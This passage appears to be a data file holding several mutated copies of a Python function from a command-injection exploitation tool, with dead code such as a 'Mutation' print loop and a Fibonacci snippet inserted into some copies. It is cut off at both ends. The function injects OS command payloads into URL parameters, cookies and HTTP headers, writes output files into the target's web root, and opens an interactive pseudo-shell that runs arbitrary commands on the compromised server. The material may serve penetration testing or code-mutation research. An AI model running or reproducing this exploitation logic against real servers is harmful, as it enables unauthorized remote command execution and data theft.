'\\n')\n                                    raise SystemExit()\n                                elif str(e.getcode()) == settings.FORBIDDEN_ERROR:\n                                    err_msg = \"You don't have permission to access this page.\"\n                                    print(settings.print_critical_msg(err_msg) + '\\n')\n                                    raise SystemExit()\n                        except (KeyboardInterrupt, SystemExit):\n                            if 'vuln_parameter' in locals():\n                                delete_previous_shell(separator, payload, TAG, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)\n                            raise\n                        except _urllib.error.URLError as e:\n                            warn_msg = \"It seems that you don't have permissions to \"\n                            warn_msg += \"read and/or write files in '\" + settings.WEB_ROOT + \"'.\"\n                            sys.stdout.write('\\r' + settings.print_warning_msg(warn_msg))\n                            err_msg = str(e).replace(': ', ' (') + ').'\n                            if settings.VERBOSITY_LEVEL >= 2:\n                                print(settings.SINGLE_WHITESPACE)\n                            print(settings.print_critical_msg(err_msg))\n                            if not menu.options.web_root:\n                                custom_web_root(url, timesec, filename, http_request_method, url_time_response)\n                            continue\n                        except:\n                            raise\n                    if shell:\n                        settings.FILE_BASED_STATE = True\n                        found = True\n                        no_result = False\n                        settings.DETECTION_PHASE = False\n                        settings.EXPLOITATION_PHASE = True\n                        if not settings.VERBOSITY_LEVEL != 0 and (not menu.options.alter_shell) and (not next_attack_vector):\n                            next_attack_vector = True\n                        if settings.COOKIE_INJECTION == True:\n                            header_name = ' cookie'\n                            found_vuln_parameter = vuln_parameter\n                            the_type = ' parameter'\n                        elif settings.USER_AGENT_INJECTION == True:\n                            header_name = ' User-Agent'\n                            found_vuln_parameter = ''\n                            the_type = ' HTTP header'\n                        elif settings.REFERER_INJECTION == True:\n                            header_name = ' Referer'\n                            found_vuln_parameter = ''\n                            the_type = ' HTTP header'\n                        elif settings.HOST_INJECTION == True:\n                            header_name = 'Host'\n                            found_vuln_parameter = ''\n                            the_type = ' HTTP header'\n                        elif settings.CUSTOM_HEADER_INJECTION == True:\n                            header_name = settings.SINGLE_WHITESPACE + settings.CUSTOM_HEADER_NAME\n                            found_vuln_parameter = ''\n                            the_type = ' HTTP header'\n                        else:\n                            header_name = ''\n                            the_type = ' parameter'\n                            if not settings.USER_DEFINED_POST_DATA:\n                                found_vuln_parameter = parameters.vuln_GET_param(url)\n                            else:\n                                found_vuln_parameter = vuln_parameter\n                        if len(found_vuln_parameter) != 0:\n                            found_vuln_parameter = \" '\" + found_vuln_parameter + Style.RESET_ALL + Style.BRIGHT + \"'\"\n                        if export_injection_info == False:\n                            export_injection_info = logs.add_type_and_technique(export_injection_info, filename, injection_type, technique)\n                        if vp_flag == True:\n                            vp_flag = logs.add_parameter(vp_flag, filename, the_type, header_name, http_request_method, vuln_parameter, payload)\n                        logs.update_payload(filename, counter, payload)\n                        counter = counter + 1\n                        if not settings.LOAD_SESSION:\n                            if settings.VERBOSITY_LEVEL == 0:\n                                print(settings.SINGLE_WHITESPACE)\n                            else:\n                                checks.total_of_requests()\n                        info_msg = settings.CHECKING_PARAMETER + ' appears to be injectable via '\n                        info_msg += '(' + injection_type.split(settings.SINGLE_WHITESPACE)[0] + ') ' + technique + '.'\n                        print(settings.print_bold_info_msg(info_msg))\n                        sub_content = str(checks.url_decode(payload))\n                        print(settings.print_sub_content(sub_content))\n                        if not settings.LOAD_SESSION:\n                            session_handler.injection_point_importation(url, technique, injection_type, separator, shell[0], vuln_parameter, prefix, suffix, TAG, alter_shell, payload, http_request_method, url_time_response=0, timesec=0, how_long=0, output_length=0, is_vulnerable=menu.options.level)\n                        else:\n                            whitespace = settings.WHITESPACES[0]\n                            settings.LOAD_SESSION = False\n                        new_line = True\n                        if settings.ENUMERATION_DONE == True:\n                            while True:\n                                message = 'Do you want to ignore stored session and enumerate again? [y/N] > '\n                                enumerate_again = common.read_input(message, default='N', check_batch=True)\n                                if enumerate_again in settings.CHOICE_YES:\n                                    if not menu.options.ignore_session:\n                                        menu.options.ignore_session = True\n                                    fb_enumeration.do_check(separator, payload, TAG, timesec, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)\n                                    break\n                                elif enumerate_again in settings.CHOICE_NO:\n                                    new_line = False\n                                    break\n                                elif file_access_again in settings.CHOICE_QUIT:\n                                    delete_previous_shell(separator, payload, TAG, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)\n                                    raise SystemExit()\n                                else:\n                                    common.invalid_option(enumerate_again)\n                                    pass\n                        elif menu.enumeration_options():\n                            fb_enumeration.do_check(separator, payload, TAG, timesec, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)\n                        if settings.FILE_ACCESS_DONE == True:\n                            while True:\n                                message = 'Do you want to ignore stored session and access files again? [y/N] > '\n                                file_access_again = common.read_input(message, default='N', check_batch=True)\n                                if file_access_again in settings.CHOICE_YES:\n                                    if not menu.options.ignore_session:\n                                        menu.options.ignore_session = True\n                                    fb_file_access.do_check(separator, payload, TAG, timesec, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)\n                                    break\n                                elif file_access_again in settings.CHOICE_NO:\n                                    break\n                                elif file_access_again in settings.CHOICE_QUIT:\n                                    delete_previous_shell(separator, payload, TAG, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)\n                                    raise SystemExit()\n                                else:\n                                    common.invalid_option(enumerate_again)\n                                    pass\n                        elif menu.file_access_options():\n                            fb_file_access.do_check(separator, payload, TAG, timesec, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)\n                        if menu.options.os_cmd:\n                            fb_enumeration.single_os_cmd_exec(separator, payload, TAG, timesec, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)\n                            delete_previous_shell(separator, payload, TAG, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)\n                        try:\n                            checks.alert()\n                            go_back = False\n                            go_back_again = False\n                            while True:\n                                delete_previous_shell(separator, payload, TAG, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)\n                                if go_back == True:\n                                    break\n                                message = settings.CHECKING_PARAMETER + ' is vulnerable. Do you want to prompt for a pseudo-terminal shell? [Y/n] > '\n                                if settings.CRAWLING:\n                                    settings.CRAWLED_URLS_INJECTED.append(_urllib.parse.urlparse(url).netloc)\n                                if not settings.STDIN_PARSING:\n                                    gotshell = common.read_input(message, default='Y', check_batch=True)\n                                else:\n                                    gotshell = common.read_input(message, default='n', check_batch=True)\n                                if gotshell in settings.CHOICE_YES:\n                                    print(settings.OS_SHELL_TITLE)\n                                    if settings.READLINE_ERROR:\n                                        checks.no_readline_module()\n                                    while True:\n                                        if not settings.READLINE_ERROR:\n                                            checks.tab_autocompleter()\n                                        sys.stdout.write(settings.OS_SHELL)\n                                        cmd = common.read_input(message='', default='os_shell', check_batch=True)\n                                        cmd = checks.escaped_cmd(cmd)\n                                        if cmd.lower() in settings.SHELL_OPTIONS:\n                                            (go_back, go_back_again) = shell_options.check_option(separator, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename, technique, go_back, no_result, timesec, go_back_again, payload, OUTPUT_TEXTFILE)\n                                            if go_back and go_back_again == False:\n                                                break\n                                            if go_back and go_back_again:\n                                                return True\n                                        else:\n                                            time.sleep(timesec)\n                                            response = fb_injector.injection(separator, payload, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)\n                                            if menu.options.ignore_session or session_handler.export_stored_cmd(url, cmd, vuln_parameter) == None:\n                                                shell = fb_injector.injection_results(url, OUTPUT_TEXTFILE, timesec)\n                                                shell = ''.join((str(p) for p in shell))\n                                                if not menu.options.ignore_session:\n                                                    session_handler.store_cmd(url, cmd, shell, vuln_parameter)\n                                            else:\n                                                shell = session_handler.export_stored_cmd(url, cmd, vuln_parameter)\n                                            if shell or shell != '':\n                                                logs.executed_command(filename, cmd, shell)\n                                                print(settings.command_execution_output(shell))\n                                            else:\n                                                err_msg = common.invalid_cmd_output(cmd)\n                                                print(settings.print_critical_msg(err_msg))\n                                elif gotshell in settings.CHOICE_NO:\n                                    if checks.next_attack_vector(technique, go_back) == True:\n                                        break\n                                    elif no_result == True:\n                                        return False\n                                    else:\n                                        return True\n                                elif gotshell in settings.CHOICE_QUIT:\n                                    delete_previous_shell(separator, payload, TAG, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)\n                                    raise SystemExit()\n                                else:\n                                    common.invalid_option(gotshell)\n                                    pass\n                        except KeyboardInterrupt:\n                            delete_previous_shell(separator, payload, TAG, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)\n                            raise\n    if no_result == True:\n        if settings.VERBOSITY_LEVEL == 0:\n            print(settings.SINGLE_WHITESPACE)\n        return False\n    else:\n        sys.stdout.write('\\r')\n        sys.stdout.flush()",
            "def fb_injection_handler(url, timesec, filename, http_request_method, url_time_response, injection_type, technique):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n    shell = False\n    counter = 1\n    vp_flag = True\n    exit_loops = False\n    no_result = True\n    is_encoded = False\n    stop_injection = False\n    call_tmp_based = False\n    next_attack_vector = False\n    export_injection_info = False\n    tmp_path = check_tmp_path(url, timesec, filename, http_request_method, url_time_response)\n    if not settings.LOAD_SESSION or settings.RETEST == True:\n        TAG = ''.join((random.choice(string.ascii_uppercase) for i in range(6)))\n        if settings.VERBOSITY_LEVEL != 0:\n            debug_msg = \"Using '\" + settings.WEB_ROOT + \"' as web server document root.\"\n            print(settings.print_debug_msg(debug_msg))\n        info_msg = \"Trying to create a file in '\" + settings.WEB_ROOT\n        info_msg += \"' for command execution output. \"\n        print(settings.print_info_msg(info_msg))\n    i = 0\n    total = len(settings.WHITESPACES) * len(settings.PREFIXES) * len(settings.SEPARATORS) * len(settings.SUFFIXES)\n    alter_shell = menu.options.alter_shell\n    for whitespace in settings.WHITESPACES:\n        for prefix in settings.PREFIXES:\n            for suffix in settings.SUFFIXES:\n                for separator in settings.SEPARATORS:\n                    settings.DETECTION_PHASE = True\n                    settings.EXPLOITATION_PHASE = False\n                    if settings.LOAD_SESSION:\n                        try:\n                            settings.FILE_BASED_STATE = True\n                            (url, technique, injection_type, separator, shell, vuln_parameter, prefix, suffix, TAG, alter_shell, payload, http_request_method, url_time_response, timesec, how_long, output_length, is_vulnerable) = session_handler.injection_point_exportation(url, http_request_method)\n                            checks.check_for_stored_tamper(payload)\n                            OUTPUT_TEXTFILE = TAG + '.txt'\n                            session_handler.notification(url, technique, injection_type)\n                            if technique == 'tempfile-based injection technique':\n                                tfb_handler.exploitation(url, timesec, filename, tmp_path, http_request_method, url_time_response)\n                        except TypeError:\n                            err_msg = \"An error occurred while accessing session file ('\"\n                            err_msg += settings.SESSION_FILE + \"'). \"\n                            err_msg += \"Use the '--flush-session' option.\"\n                            print(settings.print_critical_msg(err_msg))\n                            raise SystemExit()\n                    if settings.RETEST == True:\n                        settings.RETEST = False\n                        from src.core.injections.results_based.techniques.classic import cb_handler\n                        cb_handler.exploitation(url, timesec, filename, http_request_method, injection_type, technique)\n                    if not settings.LOAD_SESSION:\n                        i = i + 1\n                        OUTPUT_TEXTFILE = TAG + '.txt'\n                        combination = prefix + separator\n                        if combination in settings.JUNK_COMBINATION:\n                            prefix = ''\n                        try:\n                            if alter_shell:\n                                payload = fb_payloads.decision_alter_shell(separator, TAG, OUTPUT_TEXTFILE)\n                            else:\n                                payload = fb_payloads.decision(separator, TAG, OUTPUT_TEXTFILE)\n                            payload = parameters.prefixes(payload, prefix)\n                            payload = parameters.suffixes(payload, suffix)\n                            payload = payload.replace(settings.SINGLE_WHITESPACE, whitespace)\n                            payload = checks.perform_payload_modification(payload)\n                            if settings.VERBOSITY_LEVEL != 0:\n                                payload_msg = payload.replace('\\n', '\\\\n')\n                                print(settings.print_payload(payload_msg))\n                            if settings.COOKIE_INJECTION == True:\n                                vuln_parameter = parameters.specify_cookie_parameter(menu.options.cookie)\n                                response = fb_injector.cookie_injection_test(url, vuln_parameter, payload)\n                            elif settings.USER_AGENT_INJECTION == True:\n                                vuln_parameter = parameters.specify_user_agent_parameter(menu.options.agent)\n                                response = fb_injector.user_agent_injection_test(url, vuln_parameter, payload)\n                            elif settings.REFERER_INJECTION == True:\n                                vuln_parameter = parameters.specify_referer_parameter(menu.options.referer)\n                                response = fb_injector.referer_injection_test(url, vuln_parameter, payload)\n                            elif settings.HOST_INJECTION == True:\n                                vuln_parameter = parameters.specify_host_parameter(menu.options.host)\n                                response = fb_injector.host_injection_test(url, vuln_parameter, payload)\n                            elif settings.CUSTOM_HEADER_INJECTION == True:\n                                vuln_parameter = parameters.specify_custom_header_parameter(settings.INJECT_TAG)\n                                response = fb_injector.custom_header_injection_test(url, vuln_parameter, payload)\n                            else:\n                                (response, vuln_parameter) = fb_injector.injection_test(payload, http_request_method, url)\n                            output = fb_injector.injection_output(url, OUTPUT_TEXTFILE, timesec)\n                            time.sleep(timesec)\n                            try:\n                                request = _urllib.request.Request(output)\n                                headers.do_check(request)\n                                headers.check_http_traffic(request)\n                                if menu.options.proxy or menu.options.ignore_proxy:\n                                    response = proxy.use_proxy(request)\n                                elif menu.options.tor:\n                                    response = tor.use_tor(request)\n                                else:\n                                    response = _urllib.request.urlopen(request, timeout=settings.TIMEOUT)\n                                if type(response) is bool:\n                                    html_data = ''\n                                else:\n                                    html_data = checks.page_encoding(response, action='decode')\n                                shell = re.findall('' + TAG + '', str(html_data))\n                                if len(shell) != 0 and shell[0] == TAG and (not settings.VERBOSITY_LEVEL != 0):\n                                    percent = settings.info_msg\n                                    info_msg = 'Testing the ' + '(' + injection_type.split(settings.SINGLE_WHITESPACE)[0] + ') ' + technique + '.' + '' + percent + ''\n                                    sys.stdout.write('\\r' + settings.print_info_msg(info_msg))\n                                    sys.stdout.flush()\n                                if len(shell) == 0:\n                                    raise _urllib.error.HTTPError(url, 404, 'Error', {}, None)\n                            except _urllib.error.HTTPError as e:\n                                if str(e.getcode()) == settings.NOT_FOUND_ERROR:\n                                    percent = i * 100 / total\n                                    float_percent = '{0:.1f}'.format(round(i * 100 / (total * 1.0), 2))\n                                    if call_tmp_based == True:\n                                        exit_loops = True\n                                        tmp_path = os.path.split(menu.options.file_dest)[0] + '/'\n                                        tfb_controller(no_result, url, timesec, filename, tmp_path, http_request_method, url_time_response)\n                                        raise\n                                    elif i == int(menu.options.failed_tries) and no_result == True or i == total:\n                                        if i == total:\n                                            if finalize(exit_loops, no_result, float_percent, injection_type, technique):\n                                                continue\n                                            else:\n                                                raise\n                                        tmp_path = check_tmp_path(url, timesec, filename, http_request_method, url_time_response)\n                                        sys.stdout.write('\\r')\n                                        message = \"It seems that you don't have permissions to \"\n                                        message += \"read and/or write files in '\" + settings.WEB_ROOT + \"'.\"\n                                        if not menu.options.web_root:\n                                            message += \" You are advised to rerun with option '--web-root'.\"\n                                        while True:\n                                            message = message + \"\\nDo you want to use the temporary directory ('\" + tmp_path + \"')? [Y/n] > \"\n                                            tmp_upload = common.read_input(message, default='Y', check_batch=True)\n                                            if tmp_upload in settings.CHOICE_YES:\n                                                exit_loops = True\n                                                settings.TEMPFILE_BASED_STATE = True\n                                                call_tfb = tfb_controller(no_result, url, timesec, filename, tmp_path, http_request_method, url_time_response)\n                                                if call_tfb != False:\n                                                    return True\n                                                elif no_result == True:\n                                                    return False\n                                                else:\n                                                    return True\n                                            elif tmp_upload in settings.CHOICE_NO:\n                                                break\n                                            elif tmp_upload in settings.CHOICE_QUIT:\n                                                print(settings.SINGLE_WHITESPACE)\n                                                raise\n                                            else:\n                                                common.invalid_option(tmp_upload)\n                                                pass\n                                        continue\n                                    elif finalize(exit_loops, no_result, float_percent, injection_type, technique):\n                                        continue\n                                    else:\n                                        raise\n                                elif str(e.getcode()) == settings.UNAUTHORIZED_ERROR:\n                                    err_msg = 'Authorization required!'\n                                    print(settings.print_critical_msg(err_msg) + '\\n')\n                                    raise SystemExit()\n                                elif str(e.getcode()) == settings.FORBIDDEN_ERROR:\n                                    err_msg = \"You don't have permission to access this page.\"\n                                    print(settings.print_critical_msg(err_msg) + '\\n')\n                                    raise SystemExit()\n                        except (KeyboardInterrupt, SystemExit):\n                            if 'vuln_parameter' in locals():\n                                delete_previous_shell(separator, payload, TAG, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)\n                            raise\n                        except _urllib.error.URLError as e:\n                            warn_msg = \"It seems that you don't have permissions to \"\n                            warn_msg += \"read and/or write files in '\" + settings.WEB_ROOT + \"'.\"\n                            sys.stdout.write('\\r' + settings.print_warning_msg(warn_msg))\n                            err_msg = str(e).replace(': ', ' (') + ').'\n                            if settings.VERBOSITY_LEVEL >= 2:\n                                print(settings.SINGLE_WHITESPACE)\n                            print(settings.print_critical_msg(err_msg))\n                            if not menu.options.web_root:\n                                custom_web_root(url, timesec, filename, http_request_method, url_time_response)\n                            continue\n                        except:\n                            raise\n                    if shell:\n                        settings.FILE_BASED_STATE = True\n                        found = True\n                        no_result = False\n                        settings.DETECTION_PHASE = False\n                        settings.EXPLOITATION_PHASE = True\n                        if not settings.VERBOSITY_LEVEL != 0 and (not menu.options.alter_shell) and (not next_attack_vector):\n                            next_attack_vector = True\n                        if settings.COOKIE_INJECTION == True:\n                            header_name = ' cookie'\n                            found_vuln_parameter = vuln_parameter\n                            the_type = ' parameter'\n                        elif settings.USER_AGENT_INJECTION == True:\n                            header_name = ' User-Agent'\n                            found_vuln_parameter = ''\n                            the_type = ' HTTP header'\n                        elif settings.REFERER_INJECTION == True:\n                            header_name = ' Referer'\n                            found_vuln_parameter = ''\n                            the_type = ' HTTP header'\n                        elif settings.HOST_INJECTION == True:\n                            header_name = 'Host'\n                            found_vuln_parameter = ''\n                            the_type = ' HTTP header'\n                        elif settings.CUSTOM_HEADER_INJECTION == True:\n                            header_name = settings.SINGLE_WHITESPACE + settings.CUSTOM_HEADER_NAME\n                            found_vuln_parameter = ''\n                            the_type = ' HTTP header'\n                        else:\n                            header_name = ''\n                            the_type = ' parameter'\n                            if not settings.USER_DEFINED_POST_DATA:\n                                found_vuln_parameter = parameters.vuln_GET_param(url)\n                            else:\n                                found_vuln_parameter = vuln_parameter\n                        if len(found_vuln_parameter) != 0:\n                            found_vuln_parameter = \" '\" + found_vuln_parameter + Style.RESET_ALL + Style.BRIGHT + \"'\"\n                        if export_injection_info == False:\n                            export_injection_info = logs.add_type_and_technique(export_injection_info, filename, injection_type, technique)\n                        if vp_flag == True:\n                            vp_flag = logs.add_parameter(vp_flag, filename, the_type, header_name, http_request_method, vuln_parameter, payload)\n                        logs.update_payload(filename, counter, payload)\n                        counter = counter + 1\n                        if not settings.LOAD_SESSION:\n                            if settings.VERBOSITY_LEVEL == 0:\n                                print(settings.SINGLE_WHITESPACE)\n                            else:\n                                checks.total_of_requests()\n                        info_msg = settings.CHECKING_PARAMETER + ' appears to be injectable via '\n                        info_msg += '(' + injection_type.split(settings.SINGLE_WHITESPACE)[0] + ') ' + technique + '.'\n                        print(settings.print_bold_info_msg(info_msg))\n                        sub_content = str(checks.url_decode(payload))\n                        print(settings.print_sub_content(sub_content))\n                        if not settings.LOAD_SESSION:\n                            session_handler.injection_point_importation(url, technique, injection_type, separator, shell[0], vuln_parameter, prefix, suffix, TAG, alter_shell, payload, http_request_method, url_time_response=0, timesec=0, how_long=0, output_length=0, is_vulnerable=menu.options.level)\n                        else:\n                            whitespace = settings.WHITESPACES[0]\n                            settings.LOAD_SESSION = False\n                        new_line = True\n                        if settings.ENUMERATION_DONE == True:\n                            while True:\n                                message = 'Do you want to ignore stored session and enumerate again? [y/N] > '\n                                enumerate_again = common.read_input(message, default='N', check_batch=True)\n                                if enumerate_again in settings.CHOICE_YES:\n                                    if not menu.options.ignore_session:\n                                        menu.options.ignore_session = True\n                                    fb_enumeration.do_check(separator, payload, TAG, timesec, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)\n                                    break\n                                elif enumerate_again in settings.CHOICE_NO:\n                                    new_line = False\n                                    break\n                                elif file_access_again in settings.CHOICE_QUIT:\n                                    delete_previous_shell(separator, payload, TAG, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)\n                                    raise SystemExit()\n                                else:\n                                    common.invalid_option(enumerate_again)\n                                    pass\n                        elif menu.enumeration_options():\n                            fb_enumeration.do_check(separator, payload, TAG, timesec, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)\n                        if settings.FILE_ACCESS_DONE == True:\n                            while True:\n                                message = 'Do you want to ignore stored session and access files again? [y/N] > '\n                                file_access_again = common.read_input(message, default='N', check_batch=True)\n                                if file_access_again in settings.CHOICE_YES:\n                                    if not menu.options.ignore_session:\n                                        menu.options.ignore_session = True\n                                    fb_file_access.do_check(separator, payload, TAG, timesec, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)\n                                    break\n                                elif file_access_again in settings.CHOICE_NO:\n                                    break\n                                elif file_access_again in settings.CHOICE_QUIT:\n                                    delete_previous_shell(separator, payload, TAG, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)\n                                    raise SystemExit()\n                                else:\n                                    common.invalid_option(enumerate_again)\n                                    pass\n                        elif menu.file_access_options():\n                            fb_file_access.do_check(separator, payload, TAG, timesec, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)\n                        if menu.options.os_cmd:\n                            fb_enumeration.single_os_cmd_exec(separator, payload, TAG, timesec, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)\n                            delete_previous_shell(separator, payload, TAG, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)\n                        try:\n                            checks.alert()\n                            go_back = False\n                            go_back_again = False\n                            while True:\n                                delete_previous_shell(separator, payload, TAG, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)\n                                if go_back == True:\n                                    break\n                                message = settings.CHECKING_PARAMETER + ' is vulnerable. Do you want to prompt for a pseudo-terminal shell? [Y/n] > '\n                                if settings.CRAWLING:\n                                    settings.CRAWLED_URLS_INJECTED.append(_urllib.parse.urlparse(url).netloc)\n                                if not settings.STDIN_PARSING:\n                                    gotshell = common.read_input(message, default='Y', check_batch=True)\n                                else:\n                                    gotshell = common.read_input(message, default='n', check_batch=True)\n                                if gotshell in settings.CHOICE_YES:\n                                    print(settings.OS_SHELL_TITLE)\n                                    if settings.READLINE_ERROR:\n                                        checks.no_readline_module()\n                                    while True:\n                                        if not settings.READLINE_ERROR:\n                                            checks.tab_autocompleter()\n                                        sys.stdout.write(settings.OS_SHELL)\n                                        cmd = common.read_input(message='', default='os_shell', check_batch=True)\n                                        cmd = checks.escaped_cmd(cmd)\n                                        if cmd.lower() in settings.SHELL_OPTIONS:\n                                            (go_back, go_back_again) = shell_options.check_option(separator, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename, technique, go_back, no_result, timesec, go_back_again, payload, OUTPUT_TEXTFILE)\n                                            if go_back and go_back_again == False:\n                                                break\n                                            if go_back and go_back_again:\n                                                return True\n                                        else:\n                                            time.sleep(timesec)\n                                            response = fb_injector.injection(separator, payload, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)\n                                            if menu.options.ignore_session or session_handler.export_stored_cmd(url, cmd, vuln_parameter) == None:\n                                                shell = fb_injector.injection_results(url, OUTPUT_TEXTFILE, timesec)\n                                                shell = ''.join((str(p) for p in shell))\n                                                if not menu.options.ignore_session:\n                                                    session_handler.store_cmd(url, cmd, shell, vuln_parameter)\n                                            else:\n                                                shell = session_handler.export_stored_cmd(url, cmd, vuln_parameter)\n                                            if shell or shell != '':\n                                                logs.executed_command(filename, cmd, shell)\n                                                print(settings.command_execution_output(shell))\n                                            else:\n                                                err_msg = common.invalid_cmd_output(cmd)\n                                                print(settings.print_critical_msg(err_msg))\n                                elif gotshell in settings.CHOICE_NO:\n                                    if checks.next_attack_vector(technique, go_back) == True:\n                                        break\n                                    elif no_result == True:\n                                        return False\n                                    else:\n                                        return True\n                                elif gotshell in settings.CHOICE_QUIT:\n                                    delete_previous_shell(separator, payload, TAG, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)\n                                    raise SystemExit()\n                                else:\n                                    common.invalid_option(gotshell)\n                                    pass\n                        except KeyboardInterrupt:\n                            delete_previous_shell(separator, payload, TAG, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)\n                            raise\n    if no_result == True:\n        if settings.VERBOSITY_LEVEL == 0:\n            print(settings.SINGLE_WHITESPACE)\n        return False\n    else:\n        sys.stdout.write('\\r')\n        sys.stdout.flush()",
            "def fb_injection_handler(url, timesec, filename, http_request_method, url_time_response, injection_type, technique):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        n = 10\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n    shell = False\n    counter = 1\n    vp_flag = True\n    exit_loops = False\n    no_result = True\n    is_encoded = False\n    stop_injection = False\n    call_tmp_based = False\n    next_attack_vector = False\n    export_injection_info = False\n    tmp_path = check_tmp_path(url, timesec, filename, http_request_method, url_time_response)\n    if not settings.LOAD_SESSION or settings.RETEST == True:\n        TAG = ''.join((random.choice(string.ascii_uppercase) for i in range(6)))\n        if settings.VERBOSITY_LEVEL != 0:\n            debug_msg = \"Using '\" + settings.WEB_ROOT + \"' as web server document root.\"\n            print(settings.print_debug_msg(debug_msg))\n        info_msg = \"Trying to create a file in '\" + settings.WEB_ROOT\n        info_msg += \"' for command execution output. \"\n        print(settings.print_info_msg(info_msg))\n    i = 0\n    total = len(settings.WHITESPACES) * len(settings.PREFIXES) * len(settings.SEPARATORS) * len(settings.SUFFIXES)\n    alter_shell = menu.options.alter_shell\n    for whitespace in settings.WHITESPACES:\n        for prefix in settings.PREFIXES:\n            for suffix in settings.SUFFIXES:\n                for separator in settings.SEPARATORS:\n                    settings.DETECTION_PHASE = True\n                    settings.EXPLOITATION_PHASE = False\n                    if settings.LOAD_SESSION:\n                        try:\n                            settings.FILE_BASED_STATE = True\n                            (url, technique, injection_type, separator, shell, vuln_parameter, prefix, suffix, TAG, alter_shell, payload, http_request_method, url_time_response, timesec, how_long, output_length, is_vulnerable) = session_handler.injection_point_exportation(url, http_request_method)\n                            checks.check_for_stored_tamper(payload)\n                            OUTPUT_TEXTFILE = TAG + '.txt'\n                            session_handler.notification(url, technique, injection_type)\n                            if technique == 'tempfile-based injection technique':\n                                tfb_handler.exploitation(url, timesec, filename, tmp_path, http_request_method, url_time_response)\n                        except TypeError:\n                            err_msg = \"An error occurred while accessing session file ('\"\n                            err_msg += settings.SESSION_FILE + \"'). \"\n                            err_msg += \"Use the '--flush-session' option.\"\n                            print(settings.print_critical_msg(err_msg))\n                            raise SystemExit()\n                    if settings.RETEST == True:\n                        settings.RETEST = False\n                        from src.core.injections.results_based.techniques.classic import cb_handler\n                        cb_handler.exploitation(url, timesec, filename, http_request_method, injection_type, technique)\n                    if not settings.LOAD_SESSION:\n                        i = i + 1\n                        OUTPUT_TEXTFILE = TAG + '.txt'\n                        combination = prefix + separator\n                        if combination in settings.JUNK_COMBINATION:\n                            prefix = ''\n                        try:\n                            if alter_shell:\n                                payload = fb_payloads.decision_alter_shell(separator, TAG, OUTPUT_TEXTFILE)\n                            else:\n                                payload = fb_payloads.decision(separator, TAG, OUTPUT_TEXTFILE)\n                            payload = parameters.prefixes(payload, prefix)\n                            payload = parameters.suffixes(payload, suffix)\n                            payload = payload.replace(settings.SINGLE_WHITESPACE, whitespace)\n                            payload = checks.perform_payload_modification(payload)\n                            if settings.VERBOSITY_LEVEL != 0:\n                                payload_msg = payload.replace('\\n', '\\\\n')\n                                print(settings.print_payload(payload_msg))\n                            if settings.COOKIE_INJECTION == True:\n                                vuln_parameter = parameters.specify_cookie_parameter(menu.options.cookie)\n                                response = fb_injector.cookie_injection_test(url, vuln_parameter, payload)\n                            elif settings.USER_AGENT_INJECTION == True:\n                                vuln_parameter = parameters.specify_user_agent_parameter(menu.options.agent)\n                                response = fb_injector.user_agent_injection_test(url, vuln_parameter, payload)\n                            elif settings.REFERER_INJECTION == True:\n                                vuln_parameter = parameters.specify_referer_parameter(menu.options.referer)\n                                response = fb_injector.referer_injection_test(url, vuln_parameter, payload)\n                            elif settings.HOST_INJECTION == True:\n                                vuln_parameter = parameters.specify_host_parameter(menu.options.host)\n                                response = fb_injector.host_injection_test(url, vuln_parameter, payload)\n                            elif settings.CUSTOM_HEADER_INJECTION == True:\n                                vuln_parameter = parameters.specify_custom_header_parameter(settings.INJECT_TAG)\n                                response = fb_injector.custom_header_injection_test(url, vuln_parameter, payload)\n                            else:\n                                (response, vuln_parameter) = fb_injector.injection_test(payload, http_request_method, url)\n                            output = fb_injector.injection_output(url, OUTPUT_TEXTFILE, timesec)\n                            time.sleep(timesec)\n                            